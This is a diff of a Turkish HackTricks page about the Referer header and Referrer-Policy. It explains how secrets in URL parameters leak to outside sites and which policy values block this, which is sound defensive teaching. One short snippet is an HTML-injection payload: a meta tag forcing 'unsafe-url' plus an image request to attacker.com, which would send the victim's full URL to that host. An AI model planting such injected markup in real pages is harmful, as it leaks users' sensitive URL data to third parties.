@@ -1,29 +1,30 @@
 {% hint style="success" %}
-AWS Hacking'ı öğrenin ve uygulayın: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-GCP Hacking'ı öğrenin ve uygulayın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>HackTricks'i Destekleyin</summary>
 
-* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
-* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
-* **Hacking püf noktalarını paylaşarak PR'ler göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
+* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
+* **Bize katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya **bizi** **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
+* Hacking ipuçlarını paylaşmak için [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.
 
 </details>
 {% endhint %}
 
-# Referans başlıkları ve politika
 
-Referrer, tarayıcıların önceki ziyaret edilen sayfayı belirtmek için kullandığı başlıktır.
+# Yönlendiren başlıklar ve politikası
 
-## Hassas bilgiler sızdırıldı
+Yönlendiren, tarayıcılar tarafından hangi sayfanın önceki ziyaret edilen sayfa olduğunu belirtmek için kullanılan başlıktır.
 
-Eğer bir web sayfasının içinde herhangi bir noktada GET isteği parametrelerinde hassas bilgiler bulunuyorsa, sayfa harici kaynaklara bağlantılar içeriyorsa veya bir saldırgan kullanıcıyı saldırganın kontrol ettiği bir URL'yi ziyaret etmeye ikna edebiliyorsa (sosyal mühendislik), hassas bilgileri en son GET isteği içinde dışarıya çıkarabilir.
+## Hassas bilgilerin sızdırılması
 
-## Hafifletme
+Bir web sayfasında herhangi bir hassas bilgi GET isteği parametrelerinde yer alıyorsa, sayfa dış kaynaklara bağlantılar içeriyorsa veya bir saldırgan kullanıcının saldırgan tarafından kontrol edilen bir URL'yi ziyaret etmesini sağlamak/söylemek (sosyal mühendislik) için bir yol bulabiliyorsa, en son GET isteğindeki hassas bilgileri dışarı sızdırabilir.
 
-Tarayıcının diğer web uygulamalarına hassas bilgilerin gönderilmesini **önleyebilecek** bir **Referrer politikası** izlemesini sağlayabilirsiniz:
+## Azaltma
+
+Tarayıcının hassas bilgilerin diğer web uygulamalarına gönderilmesini **önleyebilecek** bir **Yönlendiren politikası** izlemesini sağlayabilirsiniz:
 ```
 Referrer-Policy: no-referrer
 Referrer-Policy: no-referrer-when-downgrade
@@ -36,27 +37,27 @@ Referrer-Policy: unsafe-url
 ```
 ## Karşı Önlem
 
-Bu kuralı geçersiz kılmak için bir HTML meta etiketi kullanabilirsiniz (saldırganın bir HTML enjeksiyonu yapması gerekmektedir):
+Bu kuralı bir HTML meta etiketi kullanarak geçersiz kılabilirsiniz (saldırganın bir HTML enjeksiyonu kullanması gerekir):
 ```markup
 <meta name="referrer" content="unsafe-url">
 <img src="https://attacker.com">
 ```
 ## Savunma
 
-Asla URL'deki GET parametreleri veya yollarda hassas veri bulundurmayın.
+Hassas verileri URL'deki GET parametreleri veya yolların içine asla koymayın.
 
 
 {% hint style="success" %}
-AWS Hacking'i öğrenin ve uygulayın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-GCP Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>HackTricks'i Destekleyin</summary>
 
-* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
-* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
-* **Hacking püf noktalarını paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
+* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
+* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter**'da **bizi takip edin** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.
 
 </details>
 {% endhint %}
